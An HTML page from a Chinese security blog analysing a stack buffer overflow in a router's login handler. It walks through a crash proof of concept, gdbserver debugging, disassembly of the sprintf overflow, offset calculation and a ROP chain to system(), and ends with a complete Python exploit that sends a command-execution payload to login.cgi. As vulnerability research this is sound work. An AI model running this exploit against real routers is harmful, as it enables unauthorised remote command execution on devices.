@@ -1,0 +1,770 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>一个路由器登录处的溢出分析和利用 | xd_xd&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="xd_xd">
+    
+
+    
+    <meta name="description" content="漏洞poc登录的时候，如果用户名或者密码字段超过一定长度，会导致http服务崩溃。
+
+可以看到服务端已经崩溃，对于这个请求，没有任何响应返回。
+动态调试环境将编译好gdb上传到路由器上。gdb下载地址
+使用nc上传文件。
+在本机上执行：
+nc -l 1111 &amp;lt; ../embedded-tools/binaries/gdbserver/gdbserver.mipsle
+路由器上执行：
+nc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一个路由器登录处的溢出分析和利用">
+<meta property="og:url" content="http://xdxd.love/2016/10/11/一个路由器登录处的溢出分析和利用/index.html">
+<meta property="og:site_name" content="xd_xd's blog">
+<meta property="og:description" content="漏洞poc登录的时候，如果用户名或者密码字段超过一定长度，会导致http服务崩溃。
+
+可以看到服务端已经崩溃，对于这个请求，没有任何响应返回。
+动态调试环境将编译好gdb上传到路由器上。gdb下载地址
+使用nc上传文件。
+在本机上执行：
+nc -l 1111 &amp;lt; ../embedded-tools/binaries/gdbserver/gdbserver.mipsle
+路由器上执行：
+nc">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips1.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips2.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips3.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips4.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips5.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips6.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips7.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips8.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips9.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips10.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips11.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips12.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips13.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips14.png">
+<meta property="og:image" content="http://xdxd.love/images/luyouqimips15.png">
+<meta property="og:updated_time" content="2016-10-17T02:48:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一个路由器登录处的溢出分析和利用">
+<meta name="twitter:description" content="漏洞poc登录的时候，如果用户名或者密码字段超过一定长度，会导致http服务崩溃。
+
+可以看到服务端已经崩溃，对于这个请求，没有任何响应返回。
+动态调试环境将编译好gdb上传到路由器上。gdb下载地址
+使用nc上传文件。
+在本机上执行：
+nc -l 1111 &amp;lt; ../embedded-tools/binaries/gdbserver/gdbserver.mipsle
+路由器上执行：
+nc">
+
+    
+    <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="xd_xd&#39;s blog" title="xd_xd&#39;s blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="xd_xd&#39;s blog">xd_xd&#39;s blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:xdxd.love">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/10/11/一个路由器登录处的溢出分析和利用/" title="一个路由器登录处的溢出分析和利用" itemprop="url">一个路由器登录处的溢出分析和利用</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="xd_xd" target="_blank" itemprop="author">xd_xd</a>
+		
+  <p class="article-time">
+    <time datetime="2016-10-11T06:32:51.000Z" itemprop="datePublished"> 发表于 Oct 11 2016</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞poc"><span class="toc-number">1.</span> <span class="toc-text">漏洞poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态调试环境"><span class="toc-number">2.</span> <span class="toc-text">动态调试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码分析"><span class="toc-number">3.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#确定偏移"><span class="toc-number">4.</span> <span class="toc-text">确定偏移</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用metasploit_pattern_generator"><span class="toc-number">4.1.</span> <span class="toc-text">使用metasploit pattern generator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#根据代码对栈进行分析"><span class="toc-number">4.2.</span> <span class="toc-text">根据代码对栈进行分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用ROP实现命令执行"><span class="toc-number">5.</span> <span class="toc-text">利用ROP实现命令执行</span></a></li></ol>
+		
+		</div>
+		
+		<h2 id="漏洞poc">漏洞poc</h2><p>登录的时候，如果用户名或者密码字段超过一定长度，会导致http服务崩溃。</p>
+<p><img src="/images/luyouqimips1.png" alt=""></p>
+<p>可以看到服务端已经崩溃，对于这个请求，没有任何响应返回。</p>
+<h2 id="动态调试环境">动态调试环境</h2><p>将编译好gdb上传到路由器上。<a href="https://github.com/rapid7/embedded-tools" target="_blank" rel="external">gdb下载地址</a></p>
+<p>使用<a href="http://xdxd.love/2016/10/10/%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4/">nc上传文件</a>。</p>
+<p>在本机上执行：</p>
+<pre><code>nc -l <span class="number">1111</span> &lt; ..<span class="regexp">/embedded-tools/</span>binaries<span class="regexp">/gdbserver/g</span>dbserver.mipsle
+</code></pre><p>路由器上执行：</p>
+<pre><code>nc <span class="number">192.168</span><span class="number">.7</span><span class="number">.51</span> <span class="number">1111</span> &gt; gdb
+</code></pre><p>接受文件保存为gdb。</p>
+<p><img src="/images/luyouqimips2.png" alt=""></p>
+<p>启动gdbserver附加进程进行远程调试。</p>
+<p><img src="/images/luyouqimips3.png" alt=""></p>
+<p>可以看到当密码超长时，程序执行流程被劫持。<br><img src="/images/luyouqimips4.png" alt=""></p>
+<h2 id="代码分析">代码分析</h2><p>搜索函数名login，可以定位到登录处理函数。<br><img src="/images/luyouqimips5.png" alt=""></p>
+<p>最后定位到溢出的代码为：sprintf函数格式化用户名和密码到缓冲区时造成溢出。</p>
+<p><img src="/images/luyouqimips6.png" alt=""></p>
+<h2 id="确定偏移">确定偏移</h2><h3 id="使用metasploit_pattern_generator">使用metasploit pattern generator</h3><p>使用metasploit pattern generator生成450个字符，作为密码发送给服务端。查看崩溃时$RA的地址。</p>
+<p><img src="/images/luyouqimips7.png" alt=""></p>
+<p><img src="/images/luyouqimips8.png" alt=""></p>
+<p>覆盖的寄存器有S0,S1,S2,RA,覆盖的值分别为：0x41396841，0x69413069，0x32694131，0x41336941。以RA为例计算其ascii为：A3iA。由于是小端系统。所以应该为Ai3A。</p>
+<p>使用metasploit pattern offset查找偏移为249。同理可以计算S0等寄存器的偏移。</p>
+<p><img src="/images/luyouqimips9.png" alt=""></p>
+<h3 id="根据代码对栈进行分析">根据代码对栈进行分析</h3><pre><code>.<span class="keyword">text</span>:<span class="number">00406</span>C6C timeout         = -<span class="number">0x1B0</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_1A8         = -<span class="number">0x1A8</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_1A0         = -<span class="number">0x1A0</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_19C         = -<span class="number">0x19C</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_198         = -<span class="number">0x198</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_118         = -<span class="number">0x118</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_116         = -<span class="number">0x116</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_10          = -<span class="number">0x10</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_C           = -<span class="number">0xC</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_8           = -<span class="number">8</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_4           = -<span class="number">4</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C                 li      <span class="variable">$gp</span>, <span class="number">0xD18F4</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C74                 addu    <span class="variable">$gp</span>, <span class="variable">$t9</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C78                 addiu   <span class="variable">$sp</span>, -<span class="number">0x1C0</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C7C                 sw      <span class="variable">$ra</span>, <span class="number">0x1C0</span>+var_4(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>C80                 sw      <span class="variable">$s2</span>, <span class="number">0x1C0</span>+var_8(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>C84                 sw      <span class="variable">$s1</span>, <span class="number">0x1C0</span>+var_C(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>C88                 sw      <span class="variable">$s0</span>, <span class="number">0x1C0</span>+var_10(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>C8C                 sw      <span class="variable">$gp</span>, <span class="number">0x1C0</span>+var_1A8(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>C90                 la      <span class="variable">$t9</span>, memset
+.<span class="keyword">text</span>:<span class="number">00406</span>C94                 addiu   <span class="variable">$s0</span>, <span class="variable">$sp</span>, <span class="number">0x1C0</span>+var_118
+.<span class="keyword">text</span>:<span class="number">00406</span>C98                 <span class="keyword">move</span>    <span class="variable">$s1</span>, <span class="variable">$a0</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C9C                 <span class="keyword">move</span>    <span class="variable">$s2</span>, <span class="variable">$a1</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CA0                 <span class="keyword">move</span>    <span class="variable">$a0</span>, <span class="variable">$s0</span>         # s
+.<span class="keyword">text</span>:<span class="number">00406</span>CA4                 <span class="keyword">move</span>    <span class="variable">$a1</span>, <span class="variable">$zero</span>       # c
+.<span class="keyword">text</span>:<span class="number">00406</span>CA8                 jalr    <span class="variable">$t9</span> ; memset
+.<span class="keyword">text</span>:<span class="number">00406</span>CAC                 li      <span class="variable">$a2</span>, <span class="number">0x102</span>       # n
+.<span class="keyword">text</span>:<span class="number">00406</span>CB0                 lw      <span class="variable">$gp</span>, <span class="number">0x1C0</span>+var_1A8(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>CB4                 beqz    <span class="variable">$s1</span>, loc_406E54
+.<span class="keyword">text</span>:<span class="number">00406</span>CB8                 nop
+.<span class="keyword">text</span>:<span class="number">00406</span>CBC                 beqz    <span class="variable">$s2</span>, loc_406E54
+.<span class="keyword">text</span>:<span class="number">00406</span>CC0                 li      <span class="variable">$v0</span>, <span class="number">0x32</span>  # <span class="string">'2'</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CC4                 la      <span class="variable">$a1</span>, aDx_selectedind  # <span class="string">"dx.selectedIndex =%d;\n"</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CC8                 la      <span class="variable">$t9</span>, sprintf
+.<span class="keyword">text</span>:<span class="number">00406</span>CCC                 <span class="keyword">move</span>    <span class="variable">$a2</span>, <span class="variable">$s1</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CD0                 addiu   <span class="variable">$a1</span>, (aUsernameSPassw - <span class="number">0x480000</span>)  # <span class="string">"username:%s\r\npassword:%s\r\n"</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CD4                 <span class="keyword">move</span>    <span class="variable">$a3</span>, <span class="variable">$s2</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CD8                 addiu   <span class="variable">$a0</span>, <span class="variable">$sp</span>, <span class="number">0x1C0</span>+var_116  # s
+.<span class="keyword">text</span>:<span class="number">00406</span>CDC                 jalr    <span class="variable">$t9</span> ; sprintf
+</code></pre><p>程序首先分配栈空间（addiu   $sp, -0x1C0），然后保存寄存器的值到栈上（sw      $ra, 0x1C0+var_4($sp)，sw      $s2, 0x1C0+var_8($sp)…），使用memset对栈空间的某个变量进行置零初始化。然后对a0，a1，就是传入的用户名密码做一个判断是否为0的判断，并没有检查长度。而sprintf函数的第一个参数a0的长度分配为($sp, 0x1C0+var_116)-16=262。</p>
+<p>其栈空间的分布如下图：<br><img src="/images/luyouqimips10.png" alt=""><br>由于字符串中拼接了用户名和其他的字符。password字段只需要249个字节之后就可以覆盖$RA。</p>
+<h2 id="利用ROP实现命令执行">利用ROP实现命令执行</h2><p>使用libc.so.0动态库中的gadget。搜索system函数地址为0004C7E0<br><img src="/images/luyouqimips11.png" alt=""></p>
+<p>使用mips rop finder插件搜索讲堆栈数据写入寄存器的指令。使用命令 mipsrop.stackfinders()</p>
+<p><img src="/images/luyouqimips12.png" alt=""></p>
+<pre><code>.text:<span class="number">000257</span>A<span class="number">0</span>                 addiu   <span class="variable">$a0</span>, <span class="variable">$sp</span>, <span class="number">0x58</span>+var_4<span class="number">0</span>
+.text:<span class="number">000257</span>A4                 move    <span class="variable">$t9</span>, <span class="variable">$s0</span>
+.text:<span class="number">000257</span>A8                 jalr    <span class="variable">$t9</span>
+</code></pre><p>0x000257A0处的的指令非常完美。将栈数据写入a0,然后跳转S0,而S0也是我们可以控制的。</p>
+<p>所以整个rop的流程为：</p>
+<p><img src="/images/luyouqimips13.png" alt=""></p>
+<p>由于libc.so.0是动态加载的，所以开始获取到的system地址是一个相对基址的偏移地址。需要获取libc.so.0动态库的基址为2ac81000。获取命令为：</p>
+<p><img src="/images/luyouqimips14.png" alt=""></p>
+<p>最终的exp如下：</p>
+<pre><code><span class="comment">#!/usr/bin/env python</span>
+<span class="comment"># encoding: utf-8</span>
+
+<span class="string">"""
+@version: 0.01
+@author: xdxd
+@license: Apache Licence 
+@contact: 646901834@qq.com
+@site: http://www.xdxd.love
+@software: PyCharm
+@file: mipsexp.py.py
+@time: 16/10/13 上午10:48
+"""</span>
+<span class="keyword">import</span> sys
+<span class="keyword">import</span> time
+<span class="keyword">import</span> string
+<span class="keyword">import</span> socket
+<span class="keyword">from</span> random <span class="keyword">import</span> Random
+<span class="keyword">import</span> urllib, urllib2, httplib
+<span class="keyword">import</span> json,struct
+<span class="keyword">import</span> requests
+
+<span class="function"><span class="keyword">def</span> <span class="title">makenop</span><span class="params">(length)</span>:</span>
+    <span class="keyword">return</span> <span class="string">'B'</span> * length
+
+<span class="function"><span class="keyword">def</span> <span class="title">makepayload</span><span class="params">(rop, cmd)</span>:</span>
+    payload = makenop(<span class="number">237</span>)
+    payload += struct.pack(<span class="string">"&lt;L"</span>, rop[<span class="number">1</span>])
+    payload += makenop(<span class="number">8</span>)
+    payload += struct.pack(<span class="string">"&lt;L"</span>, rop[<span class="number">0</span>])  <span class="comment"># eip</span>
+    payload += makenop(<span class="number">0x18</span>)
+    payload += cmd
+    payload += <span class="string">"||"</span>
+    open(<span class="string">'shellcode'</span>, <span class="string">'wb'</span>).write(payload)
+    <span class="keyword">return</span> payload
+<span class="function"><span class="keyword">def</span> <span class="title">requestsbody</span><span class="params">(url,palyload)</span>:</span>
+    proxies = {
+        <span class="string">'http'</span>: <span class="string">'http://127.0.0.1:8080'</span>,
+        <span class="string">'https'</span>: <span class="string">'http://127.0.0.1:8080'</span>,
+    }
+    requests.post(url,data=payload,proxies=proxies)
+
+<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:
+    cmd = <span class="string">"echo testxdxd &gt; /tmp/expxdxd"</span>
+    <span class="comment"># cmd ="ls"</span>
+    url = <span class="string">"http://192.168.7.1/login.cgi"</span>
+
+    libso = <span class="number">0x2ac81000</span>
+    rop = [libso + <span class="number">0x257A0</span>, libso + <span class="number">0x4c7E0</span>]
+    <span class="keyword">print</span> hex(rop[<span class="number">0</span>]), hex(rop[<span class="number">1</span>])
+    payload = {<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'userpwd'</span>:makepayload(rop,cmd)}
+    requestsbody(url,payload)
+</code></pre><p><img src="/images/luyouqimips15.png" alt=""></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/万物互联/">万物互联</a>
+</div>
+
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://xdxd.love/2016/10/11/一个路由器登录处的溢出分析和利用/" data-title="一个路由器登录处的溢出分析和利用 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2016/10/17/unicode同形字引起的安全问题/" title="unicode同形字引起的安全问题">
+  <strong>上一篇：</strong><br/>
+  <span>
+  unicode同形字引起的安全问题</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2016/10/10/常用linux命令/"  title="常用linux命令">
+ <strong>下一篇：</strong><br/> 
+ <span>常用linux命令
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="2016/10/11/一个路由器登录处的溢出分析和利用/" data-title="一个路由器登录处的溢出分析和利用" data-url="http://xdxd.love/2016/10/11/一个路由器登录处的溢出分析和利用/"></div>
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞poc"><span class="toc-number">1.</span> <span class="toc-text">漏洞poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态调试环境"><span class="toc-number">2.</span> <span class="toc-text">动态调试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码分析"><span class="toc-number">3.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#确定偏移"><span class="toc-number">4.</span> <span class="toc-text">确定偏移</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用metasploit_pattern_generator"><span class="toc-number">4.1.</span> <span class="toc-text">使用metasploit pattern generator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#根据代码对栈进行分析"><span class="toc-number">4.2.</span> <span class="toc-text">根据代码对栈进行分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用ROP实现命令执行"><span class="toc-number">5.</span> <span class="toc-text">利用ROP实现命令执行</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=5256150165&verifier=0935d97e&dpc=1"></iframe>
+</div>
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/万物互联/" title="万物互联">万物互联<sup>11</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/人生苦短/" title="人生苦短">人生苦短<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/代码审计/" title="代码审计">代码审计<sup>27</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/前端安全/" title="前端安全">前端安全<sup>8</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/加密解密/" title="加密解密">加密解密<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/奇技淫巧/" title="奇技淫巧">奇技淫巧<sup>2</sup></a></li>
+		  
+		
+		  
+		
+		  
+			<li><a href="/categories/折腾不止/" title="折腾不止">折腾不止<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/渗透测试/" title="渗透测试">渗透测试<sup>7</sup></a></li>
+		  
+		
+		  
+		
+		  
+		
+		  
+			<li><a href="/categories/移动安全/" title="移动安全">移动安全<sup>6</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/转载收藏/" title="转载收藏">转载收藏<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/黑盒测试/" title="黑盒测试">黑盒测试<sup>8</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java/" title="java">java<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/mips/" title="mips">mips<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/支付漏洞/" title="支付漏洞">支付漏洞<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/mysql/" title="mysql">mysql<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/xss/" title="xss">xss<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/qemu/" title="qemu">qemu<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/tcpdump/" title="tcpdump">tcpdump<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/逻辑漏洞/" title="逻辑漏洞">逻辑漏洞<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/密码学/" title="密码学">密码学<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/固件/" title="固件">固件<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/inspeckage/" title="inspeckage">inspeckage<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/csrf/" title="csrf">csrf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/github/" title="github">github<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/xposed/" title="xposed">xposed<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/折腾/" title="折腾">折腾<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php-wdcp/" title="php,wdcp">php,wdcp<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XXE/" title="XXE">XXE<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://www.heysec.org/" target="_blank" title="heysec.org">heysec.org</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://sco4x0.com" target="_blank" title="sco4x0&#39;s blog">sco4x0&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://virusdefender.net" target="_blank" title="virusdefender&#39;s blog">virusdefender&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.hackersb.cn/" target="_blank" title="Striker&#39;s blog">Striker&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.leavesongs.com/" target="_blank" title="离别歌">离别歌</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.stardustsky.net/" target="_blank" title="Stardustsky博客">Stardustsky博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.waitalone.cn/" target="_blank" title="独自等待">独自等待</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.cnblogs.com/S4b0r/" target="_blank" title="S4b0r&#39; blog">S4b0r&#39; blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.leesec.com/" target="_blank" title="leesec">leesec</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://xss1.com/" target="_blank" title="0x_Jin">0x_Jin</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://bl4ck.in/" target="_blank" title="Tomato">Tomato</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.hackfun.org/" target="_blank" title="4ido10n">4ido10n</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+</aside>
+</div>
+    </div>
+    <footer></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+        getSize();
+        if (myWidth >= 1024) {
+          c.click();
+        }
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#nothing"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"xdxd"};
+  (function() {
